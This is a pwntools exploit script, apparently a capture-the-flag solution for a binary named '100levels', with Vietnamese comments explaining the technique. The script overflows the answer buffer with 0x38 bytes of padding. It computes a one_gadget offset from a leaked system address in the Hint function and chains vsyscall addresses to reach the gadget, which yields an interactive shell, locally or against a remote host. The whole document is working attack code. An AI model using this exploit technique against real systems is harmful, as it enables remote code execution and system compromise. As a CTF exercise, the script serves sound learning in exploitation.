from pwn import *

def start(argv = [], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-peda
breakrva 0xd05
breakrva 0xf0c
breakrva 0xb94
# breakrva 0xf46
# breakrva 0xd26
continue
'''.format(**locals())

#Binary filename
exe = './100levels'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

################################################################

p = start()
libc = ELF("./libc.so")

'''
- Thay loi Bof tai ham nhap ket qua cho moi phep tinh (Question)
- Ham sinh phep tinh o moi level la ham de quy voi ham nhap cach ham return 0x38 
byte nen ta co junk 0x38
- Tai function Hint ta thay no luu dia chi ham system tai vi tri trung voi vi tri
nhap How many level? tai ham go nen ta co the tan dung dia chi system de tinh 
one_gadget
- Tai day minh da thay thong tin vsyscall cho tu libc 2.23 (http://terenceli.github.io/%E6%8A%80%E6%9C%AF/2019/02/13/vsyscall-and-vdso)
- Voi vsyscall la cơ chế đầu tiên trong nhân Linux để cố gắng tăng tốc việc thực hiện một số cuộc gọi hệ thống nhất định
nen ta dien no vao doan return de no thuc hien cho one_gadget

'''

def hint():
    p.recvuntil(b"Choice:\n")
    p.sendline(b"2")

hint()

vsycall = 0xffffffffff600000
one_gadget = 0x4526a
system = libc.sym['system']
offset = one_gadget - system
log.info("offset = " + hex(offset))


junk = b"a" * 0x38

p.recvuntil(b"Choice:\n")
p.sendline("1")
p.recvuntil(b"How many levels?\n")
p.sendline("0")
p.recvuntil(b"Any more?\n")
p.sendline(str(offset))

for i in range(99):
    p.recvuntil(b"Question: ")
    a = int(p.recvuntil(b" ")[:-1])
    p.recvuntil(b"* ")
    b = int(p.recvuntil(b" ")[:-1])
    p.recvuntil(b"Answer:")
    p.sendline(str(a*b))

pause()

payload = junk + p64(vsycall) * 3
p.recvuntil(b"Answer:")
p.send(payload)

p.interactive()
